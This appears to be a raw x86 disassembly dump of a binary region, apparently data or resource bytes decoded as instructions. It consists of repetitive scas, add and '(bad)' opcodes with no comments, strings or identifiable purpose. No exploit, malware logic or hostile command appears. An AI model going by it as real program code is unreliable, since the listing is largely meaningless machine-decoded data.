1100fd96:	scas   eax,DWORD PTR es:[edi]
1100fd97:	scas   eax,DWORD PTR es:[edi]
1100fd98:	scas   eax,DWORD PTR es:[edi]
1100fd99:	scas   eax,DWORD PTR es:[edi]
1100fd9a:	lahf   
1100fd9b:	scas   eax,DWORD PTR es:[edi]
1100fd9c:	mov    WORD PTR [ecx],cs
1100fd9e:	add    al,0x0
1100fda0:	add    BYTE PTR [edi],al
1100fda2:	or     DWORD PTR [esi-0x50505051],ecx
1100fda8:	scas   eax,DWORD PTR es:[edi]
1100fda9:	scas   eax,DWORD PTR es:[edi]
1100fdaa:	scas   eax,DWORD PTR es:[edi]
1100fdab:	scas   eax,DWORD PTR es:[edi]
1100fdac:	push   0x6b
1100fdae:	outs   dx,DWORD PTR ds:[esi]
1100fdaf:	jno    0x1100fe25
1100fdb1:	jne    0x1100fe2a
1100fdb3:	jae    0x1100fe25
1100fdb5:	outs   dx,DWORD PTR ds:[esi]
1100fdb6:	ins    BYTE PTR es:[edi],dx
1100fdb7:	push   0x68
1100fdb9:	bound  ebx,QWORD PTR [ebx+0x51]
1100fdbc:	dec    esi
1100fdbd:	dec    eax
1100fdbe:	inc    esp
1100fdbf:	inc    eax
1100fdc0:	aas    
1100fdc1:	cmp    BYTE PTR [ebx],dh
1100fdc3:	cmp    DWORD PTR [edi-0x60505051],ebp
1100fdc9:	lahf   
1100fdca:	scas   eax,DWORD PTR es:[edi]
1100fdcb:	scas   eax,DWORD PTR es:[edi]
1100fdcc:	lea    ecx,[ecx]
1100fdce:	push   es
1100fdcf:	add    BYTE PTR [eax],al
1100fdd1:	add    BYTE PTR [esi],al
1100fdd3:	or     DWORD PTR [esi-0x50505051],ecx
1100fdd9:	scas   eax,DWORD PTR es:[edi]
1100fdda:	scas   eax,DWORD PTR es:[edi]
1100fddb:	scas   eax,DWORD PTR es:[edi]
1100fddc:	jo     0x1100fe4b
1100fdde:	je     0x1100fe5a
1100fde0:	jnp    0x1100fe60
1100fde2:	jle    0x1100fe5e
1100fde4:	js     0x1100fe59
1100fde6:	outs   dx,DWORD PTR ds:[esi]
1100fde7:	ins    BYTE PTR es:[edi],dx
1100fde8:	imul   esp,DWORD PTR [esi+0x61],0x48494f5a
1100fdef:	inc    ebx
1100fdf0:	inc    eax
1100fdf1:	cmp    bh,BYTE PTR [eax]
1100fdf3:	ds scas eax,DWORD PTR es:[edi]
1100fdf5:	scas   eax,DWORD PTR es:[edi]
1100fdf6:	scas   eax,DWORD PTR es:[edi]
1100fdf7:	scas   eax,DWORD PTR es:[edi]
1100fdf8:	scas   eax,DWORD PTR es:[edi]
1100fdf9:	scas   eax,DWORD PTR es:[edi]
1100fdfa:	lahf   
1100fdfb:	mov    WORD PTR [ecx],cs
1100fdfd:	push   es
1100fdfe:	add    BYTE PTR [eax],al
1100fe00:	add    BYTE PTR [eax],al
1100fe02:	add    BYTE PTR [esi],al
1100fe04:	or     DWORD PTR [esi-0x50505051],ecx
1100fe0a:	scas   eax,DWORD PTR es:[edi]
1100fe0b:	scas   eax,DWORD PTR es:[edi]
1100fe0c:	xor    BYTE PTR [eax+0x7a],0x80
1100fe10:	add    DWORD PTR [esp+eax*4+0x71767e83],0x6f
1100fe18:	push   0x68
1100fe1a:	gs pop esi
1100fe1c:	pop    edx
1100fe1d:	dec    edi
1100fe1e:	dec    ecx
1100fe1f:	inc    esi
1100fe20:	inc    ebx
1100fe21:	aas    
1100fe22:	cmp    ah,BYTE PTR [edi-0x51]
1100fe25:	scas   eax,DWORD PTR es:[edi]
1100fe26:	scas   eax,DWORD PTR es:[edi]
1100fe27:	scas   eax,DWORD PTR es:[edi]
1100fe28:	lahf   
1100fe29:	lahf   
1100fe2a:	lea    ecx,[ecx]
1100fe2c:	push   es
1100fe2d:	add    BYTE PTR [eax],al
1100fe2f:	add    BYTE PTR [eax],al
1100fe31:	add    BYTE PTR [eax],al
1100fe33:	add    BYTE PTR [esi],al
1100fe35:	or     DWORD PTR [esi-0x50505051],ecx
1100fe3b:	scas   eax,DWORD PTR es:[edi]
1100fe3c:	xchg   ecx,eax
1100fe3d:	je     0x1100febe
1100fe3f:	xchg   BYTE PTR [ecx-0x7c787576],cl
1100fe45:	jle    0x1100febf
1100fe47:	jno    0x1100feb5
1100fe49:	imul   esp,DWORD PTR [esi+0x64],0x494f515d
1100fe50:	inc    ebp
1100fe51:	inc    ecx
1100fe52:	aas    
1100fe53:	sub    DWORD PTR [edi-0x50505061],0x4098d
	...
1100fe65:	pop    es
1100fe66:	or     DWORD PTR [ebp-0x50505051],ecx
1100fe6c:	sahf   
1100fe6d:	jbe    0x1100fdf1
1100fe6f:	mov    DWORD PTR [edi-0x78746f6e],ecx
1100fe75:	cmp    BYTE PTR [edx+0x73],0x6d
1100fe79:	push   0x68
1100fe7b:	fs popa 
1100fe7d:	push   ebp
1100fe7e:	push   edx
1100fe7f:	dec    ebp
1100fe80:	dec    eax
1100fe81:	inc    esp
1100fe82:	inc    esp
1100fe83:	fwait
1100fe84:	scas   eax,DWORD PTR es:[edi]
1100fe85:	scas   eax,DWORD PTR es:[edi]
1100fe86:	scas   eax,DWORD PTR es:[edi]
1100fe87:	scas   eax,DWORD PTR es:[edi]
1100fe88:	mov    cs,WORD PTR [ecx]
1100fe8a:	add    eax,DWORD PTR [eax]
	...
1100fe94:	add    BYTE PTR [eax],al
1100fe96:	add    BYTE PTR [ecx],cl
1100fe98:	mov    gs,WORD PTR [edi-0x74505051]
1100fe9e:	or     DWORD PTR [edx-0x6f69696d],0xffffff8a
1100fea5:	test   BYTE PTR [ebx+0x77],bh
1100fea8:	outs   dx,DWORD PTR ds:[esi]
1100fea9:	imul   ebp,DWORD PTR [eax+0x65],0x61
1100fead:	pop    edi
1100feae:	push   esi
1100feaf:	dec    edi
1100feb0:	dec    ebx
1100feb1:	inc    ebp
1100feb2:	jb     0x1100fe63
1100feb4:	scas   eax,DWORD PTR es:[edi]
1100feb5:	scas   eax,DWORD PTR es:[edi]
1100feb6:	scas   eax,DWORD PTR es:[edi]
1100feb7:	lea    ecx,[ecx]
1100feb9:	add    DWORD PTR [eax],eax
	...
1100fec7:	add    DWORD PTR [ecx],ecx
1100fec9:	mov    gs,WORD PTR [edi-0x7c615051]
1100fecf:	mov    DWORD PTR [edx-0x756e6969],edx
1100fed5:	test   BYTE PTR [esi+0x75],bh
1100fed8:	outs   dx,DWORD PTR ds:[esi]
1100fed9:	push   0x68
1100fedb:	gs popa 
1100fedd:	pop    edi
1100fede:	pop    ebp
1100fedf:	push   esp
1100fee0:	dec    ebp
1100fee1:	push   ecx
1100fee2:	pushf  
1100fee3:	scas   eax,DWORD PTR es:[edi]
1100fee4:	scas   eax,DWORD PTR es:[edi]
1100fee5:	scas   eax,DWORD PTR es:[edi]
1100fee6:	mov    cs,WORD PTR [ecx]
	...
1100fef4:	add    BYTE PTR [eax],al
1100fef6:	add    BYTE PTR [ebx],dl
1100fef8:	add    eax,0xafaf8e09
1100fefd:	scas   eax,DWORD PTR es:[edi]
1100fefe:	cdq    
1100feff:	xchg   BYTE PTR [ebx-0x76706c6d],cl
1100ff05:	cmp    DWORD PTR [ebx+0x77],0x6f
1100ff09:	push   0x68
1100ff0b:	gs popa 
1100ff0d:	pop    edi
1100ff0e:	pop    ebp
1100ff0f:	push   esi
1100ff10:	push   edx
1100ff11:	xchg   ecx,eax
1100ff12:	scas   eax,DWORD PTR es:[edi]
1100ff13:	scas   eax,DWORD PTR es:[edi]
1100ff14:	scas   eax,DWORD PTR es:[edi]
1100ff15:	lea    ecx,[ecx]
1100ff17:	add    eax,0x113
	...
1100ff24:	add    BYTE PTR [eax],al
1100ff26:	add    BYTE PTR [eax],bl
1100ff28:	xor    eax,0xaf8e0905
1100ff2d:	scas   eax,DWORD PTR es:[edi]
1100ff2e:	scas   eax,DWORD PTR es:[edi]
1100ff2f:	cwde   
1100ff30:	test   BYTE PTR [eax-0x7f797676],cl
1100ff36:	jns    0x1100ffa9
1100ff38:	ins    DWORD PTR es:[edi],dx
1100ff39:	push   0x66
1100ff3b:	fs popa 
1100ff3d:	pop    edi
1100ff3e:	push   esi
1100ff3f:	push   esi
1100ff40:	mov    ch,BYTE PTR [edi+0x98eafaf]
1100ff46:	add    eax,0x1835
	...
1100ff57:	sbb    DWORD PTR [ebp+esi*1+0x5],ecx
1100ff5b:	or     DWORD PTR [esi-0x66505051],ecx
1100ff61:	add    DWORD PTR [ebx+0x747a7f82],0x6e
1100ff68:	ins    BYTE PTR es:[edi],dx
1100ff69:	push   0x5d5f6165
1100ff6e:	popa   
1100ff6f:	xchg   ebx,eax
1100ff70:	scas   eax,DWORD PTR es:[edi]
1100ff71:	scas   eax,DWORD PTR es:[edi]
1100ff72:	scas   eax,DWORD PTR es:[edi]
1100ff73:	mov    cs,WORD PTR [ecx]
1100ff75:	add    eax,0x194f35
	...
1100ff86:	add    BYTE PTR [edx],bl
1100ff88:	push   ebx
1100ff89:	dec    edi
1100ff8a:	xor    eax,0xaf8e0905
1100ff8f:	scas   eax,DWORD PTR es:[edi]
1100ff90:	scas   eax,DWORD PTR es:[edi]
1100ff91:	sahf   
1100ff92:	mov    edi,DWORD PTR [ecx+0x74]
1100ff95:	jo     0x11010004
1100ff97:	imul   ebp,DWORD PTR [eax+0x65],0x62
1100ff9b:	pop    edi
1100ff9c:	pop    edi
1100ff9d:	jp     0x1100ff3c
1100ff9f:	scas   eax,DWORD PTR es:[edi]
1100ffa0:	scas   eax,DWORD PTR es:[edi]
1100ffa1:	scas   eax,DWORD PTR es:[edi]
1100ffa2:	mov    cs,WORD PTR [ecx]
1100ffa4:	add    eax,0x1a524e35
	...
1100ffb5:	add    BYTE PTR [eax],al
1100ffb7:	sbb    dl,BYTE PTR [ebx+0x53]
1100ffba:	dec    esi
1100ffbb:	xor    eax,0xaf8e0905
1100ffc0:	scas   eax,DWORD PTR es:[edi]
1100ffc1:	scas   eax,DWORD PTR es:[edi]
1100ffc2:	scas   eax,DWORD PTR es:[edi]
1100ffc3:	sahf   
1100ffc4:	xchg   ecx,eax
1100ffc5:	xor    BYTE PTR [eax+0x6a],0x68
1100ffc9:	ins    BYTE PTR es:[edi],dx
1100ffca:	jne    0x1100ff55
1100ffcc:	popf   
1100ffcd:	lahf   
1100ffce:	scas   eax,DWORD PTR es:[edi]
1100ffcf:	scas   eax,DWORD PTR es:[edi]
1100ffd0:	scas   eax,DWORD PTR es:[edi]
1100ffd1:	mov    cs,WORD PTR [ecx]
1100ffd3:	add    eax,0x53524f35
1100ffd8:	sbb    al,BYTE PTR [ecx]
	...
1100ffe6:	add    DWORD PTR [edx],ebx
1100ffe8:	push   ebx
1100ffe9:	push   ebx
1100ffea:	push   ebx
1100ffeb:	dec    ebp
1100ffec:	xor    eax,0xaf8e0905
1100fff1:	scas   eax,DWORD PTR es:[edi]
1100fff2:	scas   eax,DWORD PTR es:[edi]
1100fff3:	scas   eax,DWORD PTR es:[edi]
1100fff4:	scas   eax,DWORD PTR es:[edi]
1100fff5:	scas   eax,DWORD PTR es:[edi]
1100fff6:	scas   eax,DWORD PTR es:[edi]
1100fff7:	scas   eax,DWORD PTR es:[edi]
1100fff8:	scas   eax,DWORD PTR es:[edi]
1100fff9:	scas   eax,DWORD PTR es:[edi]
1100fffa:	scas   eax,DWORD PTR es:[edi]
1100fffb:	scas   eax,DWORD PTR es:[edi]
1100fffc:	scas   eax,DWORD PTR es:[edi]
1100fffd:	scas   eax,DWORD PTR es:[edi]
1100fffe:	scas   eax,DWORD PTR es:[edi]
1100ffff:	scas   eax,DWORD PTR es:[edi]
11010000:	mov    cs,WORD PTR [ecx]
11010002:	add    eax,0x53534c35
11010007:	push   ebx
11010008:	sbb    al,BYTE PTR [eax]
	...
11010016:	add    BYTE PTR [edx],bl
11010018:	push   ebx
11010019:	push   esi
1101001a:	push   ebx
1101001b:	push   ebx
1101001c:	dec    esp
1101001d:	xor    eax,0xaf8e0905
11010022:	scas   eax,DWORD PTR es:[edi]
11010023:	scas   eax,DWORD PTR es:[edi]
11010024:	scas   eax,DWORD PTR es:[edi]
11010025:	scas   eax,DWORD PTR es:[edi]
11010026:	scas   eax,DWORD PTR es:[edi]
11010027:	scas   eax,DWORD PTR es:[edi]
11010028:	scas   eax,DWORD PTR es:[edi]
11010029:	scas   eax,DWORD PTR es:[edi]
1101002a:	scas   eax,DWORD PTR es:[edi]
1101002b:	scas   eax,DWORD PTR es:[edi]
1101002c:	scas   eax,DWORD PTR es:[edi]
1101002d:	scas   eax,DWORD PTR es:[edi]
1101002e:	scas   eax,DWORD PTR es:[edi]
1101002f:	lea    ecx,[ecx]
11010031:	add    eax,0x53524f35
11010036:	push   esi
11010037:	push   ebx
11010038:	sbb    al,BYTE PTR [eax]
	...
11010046:	add    BYTE PTR [edx],bl
11010048:	push   esi
11010049:	push   ebx
1101004a:	push   esi
1101004b:	push   ebx
1101004c:	push   ebx
1101004d:	dec    esp
1101004e:	xor    eax,0xaf8e0905
11010053:	scas   eax,DWORD PTR es:[edi]
11010054:	scas   eax,DWORD PTR es:[edi]
11010055:	scas   eax,DWORD PTR es:[edi]
11010056:	scas   eax,DWORD PTR es:[edi]
11010057:	scas   eax,DWORD PTR es:[edi]
11010058:	scas   eax,DWORD PTR es:[edi]
11010059:	scas   eax,DWORD PTR es:[edi]
1101005a:	scas   eax,DWORD PTR es:[edi]
1101005b:	scas   eax,DWORD PTR es:[edi]
1101005c:	lahf   
1101005d:	scas   eax,DWORD PTR es:[edi]
1101005e:	mov    cs,WORD PTR [ecx]
11010060:	add    eax,0x53544c35
11010065:	push   esi
11010066:	push   ebx
11010067:	push   ebx
11010068:	sbb    al,BYTE PTR [eax]
	...
11010076:	add    BYTE PTR [edx],bl
11010078:	push   ebx
11010079:	push   ebx
1101007a:	push   ebx
1101007b:	push   ebx
1101007c:	push   ebx
1101007d:	push   ebx
1101007e:	dec    esp
1101007f:	xor    eax,0xaf8e0905
11010084:	scas   eax,DWORD PTR es:[edi]
11010085:	scas   eax,DWORD PTR es:[edi]
11010086:	scas   eax,DWORD PTR es:[edi]
11010087:	scas   eax,DWORD PTR es:[edi]
11010088:	scas   eax,DWORD PTR es:[edi]
11010089:	scas   eax,DWORD PTR es:[edi]
1101008a:	scas   eax,DWORD PTR es:[edi]
1101008b:	scas   eax,DWORD PTR es:[edi]
1101008c:	scas   eax,DWORD PTR es:[edi]
1101008d:	mov    cs,WORD PTR [ecx]
1101008f:	add    eax,0x53524e35
11010094:	push   ebx
11010095:	push   ebx
11010096:	push   ebx
11010097:	push   ebx
11010098:	sbb    al,BYTE PTR [eax]
	...
110100a6:	add    BYTE PTR ds:0x1a1a1a1a,cl
110100ac:	sbb    bl,BYTE PTR [edx]
110100ae:	sbb    DWORD PTR [eax],ebx
110100b0:	adc    eax,DWORD PTR [eax]
110100b2:	or     DWORD PTR [esi-0x50505051],ecx
110100b8:	scas   eax,DWORD PTR es:[edi]
110100b9:	scas   eax,DWORD PTR es:[edi]
110100ba:	scas   eax,DWORD PTR es:[edi]
110100bb:	lahf   
110100bc:	mov    WORD PTR [ecx],cs
110100be:	add    BYTE PTR [ebx],dl
110100c0:	sbb    BYTE PTR [ecx],bl
110100c2:	sbb    bl,BYTE PTR [edx]
110100c4:	sbb    bl,BYTE PTR [edx]
110100c6:	sbb    bl,BYTE PTR [edx]
110100c8:	or     eax,0x0
	...
110100e1:	add    BYTE PTR [eax],al
110100e3:	or     DWORD PTR [esi-0x50505051],ecx
110100e9:	scas   eax,DWORD PTR es:[edi]
110100ea:	scas   eax,DWORD PTR es:[edi]
110100eb:	mov    cs,WORD PTR [ecx]
	...
11010111:	add    BYTE PTR [eax],al
11010113:	push   es
11010114:	or     DWORD PTR [esi-0x50505051],ecx
1101011a:	lea    ecx,[ecx]
1101011c:	push   es
	...
11010141:	add    BYTE PTR [eax],al
11010143:	add    BYTE PTR [esi],al
11010145:	or     DWORD PTR [esi+0x98dafaf],ecx
1101014b:	pop    es
	...
11010174:	add    BYTE PTR [esi],al
11010176:	or     DWORD PTR [esi+0x6098e],ecx
	...
110101a4:	add    BYTE PTR [eax],al
110101a6:	push   es
110101a7:	or     DWORD PTR [ecx],ecx
110101a9:	pop    es
	...
110101d6:	add    BYTE PTR [edi],al
110101d8:	pop    es
	...
1101021d:	add    BYTE PTR [eax],al
1101021f:	add    bh,bh
11010221:	(bad)  
11010222:	(bad)  
11010223:	(bad)  
11010224:	(bad)  
11010225:	inc    DWORD PTR [eax]
11010227:	push   cs
11010228:	(bad)  
11010229:	(bad)  
1101022a:	(bad)  
1101022b:	jg     0x1101022c
1101022d:	inc    DWORD PTR [eax]
1101022f:	push   cs
11010230:	(bad)  
11010231:	(bad)  
11010232:	cld    
11010233:	aas    
11010234:	(bad)  
11010235:	inc    DWORD PTR [eax]
11010237:	push   cs
11010238:	(bad)  
11010239:	(bad)  
1101023a:	clc    
1101023b:	pop    ds
1101023c:	(bad)  
1101023d:	inc    DWORD PTR [eax]
1101023f:	push   cs
11010240:	(bad)  
11010241:	push   eax
11010243:	ud0    edi,edi
11010246:	add    BYTE PTR [esi],cl
11010248:	(bad)  
11010249:	jmp    eax
1101024b:	pop    es
1101024c:	(bad)  
1101024d:	inc    DWORD PTR [eax]
1101024f:	push   cs
11010250:	cld    
11010251:	add    BYTE PTR [eax],al
11010253:	add    BYTE PTR [eax],al
11010255:	aas    
11010256:	add    BYTE PTR [esi],cl
11010258:	cld    
11010259:	add    BYTE PTR [eax],al
1101025b:	add    BYTE PTR [eax],al
1101025d:	aas    
1101025e:	add    BYTE PTR [esi],cl
11010260:	cld    
11010261:	add    BYTE PTR [eax],al
11010263:	add    BYTE PTR [eax],al
11010265:	aas    
11010266:	add    BYTE PTR [esi],cl
11010268:	cld    
11010269:	add    BYTE PTR [eax],al
1101026b:	add    BYTE PTR [eax],al
1101026d:	aas    
1101026e:	add    BYTE PTR [esi],cl
11010270:	cld    
11010271:	add    BYTE PTR [eax],al
11010273:	add    BYTE PTR [eax],al
11010275:	aas    
11010276:	add    BYTE PTR [esi],cl
11010278:	cld    
11010279:	add    BYTE PTR [eax],al
1101027b:	add    BYTE PTR [eax],al
1101027d:	aas    
1101027e:	add    BYTE PTR [esi],cl
11010280:	cld    
11010281:	add    BYTE PTR [eax],al
11010283:	add    BYTE PTR [eax],al
11010285:	aas    
11010286:	add    BYTE PTR [esi],cl
11010288:	cld    
11010289:	add    BYTE PTR [eax],al
1101028b:	add    BYTE PTR [eax],al
1101028d:	aas    
1101028e:	add    BYTE PTR [esi],cl
11010290:	cld    
11010291:	add    BYTE PTR [eax],al
11010293:	add    BYTE PTR [eax],al
11010295:	aas    
11010296:	add    BYTE PTR [esi],cl
11010298:	cld    
11010299:	add    BYTE PTR [eax],al
1101029b:	add    BYTE PTR [eax],al
1101029d:	aas    
1101029e:	add    BYTE PTR [esi],cl
110102a0:	cld    
110102a1:	add    BYTE PTR [eax],al
110102a3:	add    BYTE PTR [eax],al
110102a5:	aas    
110102a6:	add    BYTE PTR [esi],cl
110102a8:	cld    
110102a9:	add    BYTE PTR [eax],al
110102ab:	add    BYTE PTR [eax],al
110102ad:	aas    
110102ae:	add    BYTE PTR [esi],cl
110102b0:	cld    
110102b1:	add    BYTE PTR [eax],al
110102b3:	add    BYTE PTR [eax],al
110102b5:	aas    
110102b6:	add    BYTE PTR [esi],cl
110102b8:	clc    
110102b9:	add    BYTE PTR [eax],al
110102bb:	add    BYTE PTR [eax],al
110102bd:	pop    ds
110102be:	add    BYTE PTR [esi],cl
110102c0:	lock add BYTE PTR [eax],al
110102c3:	add    BYTE PTR [eax],al
110102c5:	str    WORD PTR [esi]
110102c8:	loopne 0x110102ca
110102ca:	add    BYTE PTR [eax],al
110102cc:	add    BYTE PTR [edi],al
110102ce:	add    BYTE PTR [esi],cl
110102d0:	rol    BYTE PTR [eax],0x0
110102d3:	add    BYTE PTR [eax],al
110102d5:	add    eax,DWORD PTR [eax]
110102d7:	push   cs
110102d8:	add    BYTE PTR [eax],0x0
110102db:	add    BYTE PTR [eax],al
110102dd:	add    DWORD PTR [eax],eax
110102df:	push   cs
110102e0:	add    BYTE PTR [eax],0x0
110102e3:	add    BYTE PTR [eax],al
110102e5:	add    DWORD PTR [eax],eax
110102e7:	push   cs
110102e8:	rol    BYTE PTR [eax],0x0
110102eb:	add    BYTE PTR [eax],al
110102ed:	add    eax,DWORD PTR [eax]
110102ef:	push   cs
110102f0:	loopne 0x110102f2
110102f2:	add    BYTE PTR [eax],al
110102f4:	add    BYTE PTR [edi],al
110102f6:	add    BYTE PTR [esi],cl
110102f8:	lock add BYTE PTR [eax],al
110102fb:	add    BYTE PTR [eax],al
110102fd:	str    WORD PTR [esi]
11010300:	clc    
11010301:	add    BYTE PTR [eax],al
11010303:	add    BYTE PTR [eax],al
11010305:	pop    ds
11010306:	add    BYTE PTR [esi],cl
11010308:	cld    
11010309:	add    BYTE PTR [eax],al
1101030b:	add    BYTE PTR [eax],al
1101030d:	aas    
1101030e:	add    BYTE PTR [esi],cl
11010310:	cld    
11010311:	add    BYTE PTR [eax],al
11010313:	add    BYTE PTR [eax],al
11010315:	aas    
11010316:	add    BYTE PTR [esi],cl
11010318:	cld    
11010319:	add    BYTE PTR [eax],al
1101031b:	add    BYTE PTR [eax],al
1101031d:	aas    
1101031e:	add    BYTE PTR [esi],cl
11010320:	cld    
11010321:	add    BYTE PTR [eax],al
11010323:	add    BYTE PTR [eax],al
11010325:	aas    
11010326:	add    BYTE PTR [esi],cl
11010328:	cld    
11010329:	add    BYTE PTR [eax],al
1101032b:	add    BYTE PTR [eax],al
1101032d:	aas    
1101032e:	add    BYTE PTR [esi],cl
11010330:	cld    
11010331:	add    BYTE PTR [eax],al
11010333:	add    BYTE PTR [eax],al
11010335:	aas    
11010336:	add    BYTE PTR [esi],cl
11010338:	cld    
11010339:	add    BYTE PTR [eax],al
1101033b:	add    BYTE PTR [eax],al
1101033d:	aas    
1101033e:	add    BYTE PTR [esi],cl
11010340:	cld    
11010341:	add    BYTE PTR [eax],al
11010343:	add    BYTE PTR [eax],al
11010345:	aas    
11010346:	add    BYTE PTR [esi],cl
11010348:	cld    
11010349:	add    BYTE PTR [eax],al
1101034b:	add    BYTE PTR [eax],al
1101034d:	aas    
1101034e:	add    BYTE PTR [esi],cl
11010350:	cld    
11010351:	add    BYTE PTR [eax],al
11010353:	add    BYTE PTR [eax],al
11010355:	aas    
11010356:	add    BYTE PTR [esi],cl
11010358:	cld    
11010359:	add    BYTE PTR [eax],al
1101035b:	add    BYTE PTR [eax],al
1101035d:	aas    
1101035e:	add    BYTE PTR [esi],cl
11010360:	cld    
11010361:	add    BYTE PTR [eax],al
11010363:	add    BYTE PTR [eax],al
11010365:	aas    
11010366:	add    BYTE PTR [esi],cl
11010368:	cld    
11010369:	add    BYTE PTR [eax],al
1101036b:	add    BYTE PTR [eax],al
1101036d:	aas    
1101036e:	add    BYTE PTR [esi],cl
11010370:	(bad)  
11010371:	jmp    eax
11010373:	pop    es
11010374:	(bad)  
11010375:	inc    DWORD PTR [eax]
11010377:	push   cs
11010378:	(bad)  
11010379:	push   eax
1101037b:	ud0    edi,edi
1101037e:	add    BYTE PTR [esi],cl
11010380:	(bad)  
11010381:	(bad)  
11010382:	clc    
11010383:	pop    ds
11010384:	(bad)  
11010385:	inc    DWORD PTR [eax]
11010387:	push   cs
11010388:	(bad)  
11010389:	(bad)  
1101038a:	cld    
1101038b:	aas    
1101038c:	(bad)  
1101038d:	inc    DWORD PTR [eax]
1101038f:	push   cs
11010390:	(bad)  
11010391:	(bad)  
11010392:	(bad)  
11010393:	jg     0x11010394
11010395:	inc    DWORD PTR [eax]
11010397:	push   cs
11010398:	(bad)  
11010399:	(bad)  
1101039a:	(bad)  
1101039b:	(bad)  
1101039c:	(bad)  
1101039d:	inc    DWORD PTR [eax]
1101039f:	push   cs
110103a0:	sub    BYTE PTR [eax],al
110103a2:	add    BYTE PTR [eax],al
110103a4:	sub    BYTE PTR [eax],al
110103a6:	add    BYTE PTR [eax],al
110103a8:	push   eax
110103a9:	add    BYTE PTR [eax],al
110103ab:	add    BYTE PTR [ecx],al
110103ad:	add    BYTE PTR [eax],cl
	...
110103cb:	add    BYTE PTR ds:0xc000505,al
110103d1:	pop    es
110103d2:	add    al,0x0
110103d4:	or     cl,BYTE PTR [edx]
110103d6:	or     al,BYTE PTR [eax]
110103d8:	push   cs
110103d9:	push   cs
110103da:	push   cs
110103db:	add    BYTE PTR [edi+ecx*1],bl
110103de:	or     al,BYTE PTR [eax]
110103e0:	sbb    al,0x10
110103e2:	or     al,BYTE PTR [eax]
110103e4:	adc    BYTE PTR [eax],dl
110103e6:	adc    BYTE PTR [eax],al
110103e8:	push   ds
110103e9:	push   ds
110103ea:	push   ds
110103eb:	add    BYTE PTR ds:0x29001019,ch
110103f1:	sub    DWORD PTR [ecx],ebp
110103f3:	add    BYTE PTR [esi],ch
110103f5:	cs add BYTE PTR cs:[eax],dh
110103f9:	xor    BYTE PTR [eax],dh
110103fb:	add    BYTE PTR [esi],dh
110103fd:	ss add BYTE PTR ss:[edx],bh
11010401:	cmp    bh,BYTE PTR [edx]
11010403:	add    BYTE PTR ds:0x45003d3d,bh
11010409:	daa    
1101040a:	sbb    DWORD PTR [eax],eax
1101040c:	arpl   WORD PTR [edi],si
1101040e:	and    al,0x0
11010410:	arpl   WORD PTR [eax],di
11010412:	and    al,0x0
11010414:	cmp    BYTE PTR fs:[eax+eax*1],ah
11010418:	ins    DWORD PTR es:[edi],dx
11010419:	cmp    eax,0x3f710028
1101041e:	sub    DWORD PTR [eax],eax
11010420:	jb     0x11010462
11010422:	sub    al,BYTE PTR [eax]
11010424:	inc    edx
11010425:	inc    edx
11010426:	inc    edx
11010427:	add    BYTE PTR [esi+0x46],al
1101042a:	inc    esi
1101042b:	add    BYTE PTR [ecx+0x49],cl
1101042e:	dec    ecx
1101042f:	add    BYTE PTR [esi+0x4e],cl
11010432:	dec    esi
11010433:	add    BYTE PTR [edi+0x57],dl
11010436:	push   edi
11010437:	add    BYTE PTR [ecx+0x59],bl
1101043a:	pop    ecx
1101043b:	add    BYTE PTR [ebp+0x5d],bl
1101043e:	pop    ebp
1101043f:	add    BYTE PTR [ecx+0x61],ah
11010442:	popa   
11010443:	add    BYTE PTR [ebp+0x65],ah
11010446:	add    BYTE PTR gs:[eax+0x68],ch
1101044a:	push   0x6c6c6c00
1101044f:	add    BYTE PTR [ecx+0x79],bh
11010452:	jns    0x11010454
11010454:	jle    0x110104d4
11010456:	jle    0x11010458
11010458:	mov    DWORD PTR [ebp+0x33],ecx
1101045b:	add    BYTE PTR [eax-0x67ffcaaf],dl
11010461:	push   esi
11010462:	cmp    BYTE PTR [eax],al
11010464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11010465:	pop    esi
11010466:	add    BYTE PTR ds:[ecx-0x55ffc1a1],ch
1101046d:	pusha  
1101046e:	aas    
1101046f:	add    cl,cl
11010471:	push   ebx
11010472:	cs add cl,cl
11010475:	push   esp
11010476:	das    
11010477:	add    ah,cl
11010479:	push   edi
1101047a:	xor    DWORD PTR [eax],eax
1101047c:	iret   
1101047d:	pop    ebx
1101047e:	xor    eax,0x385fd200
11010483:	add    bl,dl
11010485:	pusha  
11010486:	cmp    DWORD PTR [eax],eax
11010488:	aad    0x64
1101048a:	cmp    al,0x0
1101048c:	fldcw  WORD PTR [eax+0x3f]
1101048f:	add    BYTE PTR [esi-0x4dffbf9e],ch
11010495:	fs inc edx
11010497:	add    BYTE PTR [ebp-0x49ffbc9a],dh
1101049d:	inc    sp
1101049f:	add    ch,al
110104a1:	outs   dx,DWORD PTR ds:[esi]
110104a2:	dec    ecx
110104a3:	add    ch,dl
110104a5:	addr16 inc ecx
110104a7:	add    cl,bl
110104a9:	imul   eax,DWORD PTR [eax+0x0],0x426cdc
110104b0:	fsubr  DWORD PTR [ebx+0x44]
110104b3:	add    ch,bl
110104b5:	outs   dx,BYTE PTR ds:[esi]
110104b6:	inc    esp
110104b7:	add    al,dl
110104b9:	imul   ecx,DWORD PTR [ecx+0x0],0x4570df
110104c0:	xlat   BYTE PTR ds:[ebx]
110104c1:	jae    0x11010515
110104c3:	add    bh,bl
110104c5:	jle    0x11010521
110104c7:	add    al,ah
110104c9:	jno    0x11010512
110104cb:	add    al,ah
110104cd:	jb     0x11010518
110104cf:	add    dl,ah
110104d1:	je     0x1101051c
110104d3:	add    bl,ah
110104d5:	ja     0x11010523
110104d7:	add    bl,ah
110104d9:	js     0x11010529
110104db:	add    ch,ah
110104dd:	jns    0x1101052c
110104df:	add    cl,ah
110104e1:	jg     0x11010536
110104e3:	add    bh,ah
110104e5:	jge    0x11010539
110104e7:	add    cl,ah
110104e9:	jg     0x1101053f
110104eb:	add    bh,ah
110104ed:	jle    0x11010543
110104ef:	add    cl,ch
110104f1:	jle    0x11010544
110104f3:	add    cl,ch
110104f5:	adc    DWORD PTR [esi+0x0],0x5582ec
110104fc:	jmp    0xfb015c85
11010501:	sbb    DWORD PTR [eax+0x0],0xffffffe9
11010505:	test   BYTE PTR [ecx+0x0],bl
11010508:	in     eax,dx
11010509:	xchg   BYTE PTR [eax+0x0],bl
1101050c:	in     eax,dx
1101050d:	mov    DWORD PTR [esi+0x0],ebx
11010510:	repnz mov BYTE PTR [edx+0x0],bl
11010514:	hlt    
11010515:	mov    bl,BYTE PTR [ebx+0x0]
11010518:	lock mov bl,BYTE PTR [ebp+0x0]
1101051c:	repnz mov WORD PTR [esi+0x0],ds
11010520:	ficom  WORD PTR [edx-0x7516ff87]
11010526:	arpl   WORD PTR [eax],ax
11010528:	in     eax,dx
11010529:	mov    esp,DWORD PTR [eax+0x0]
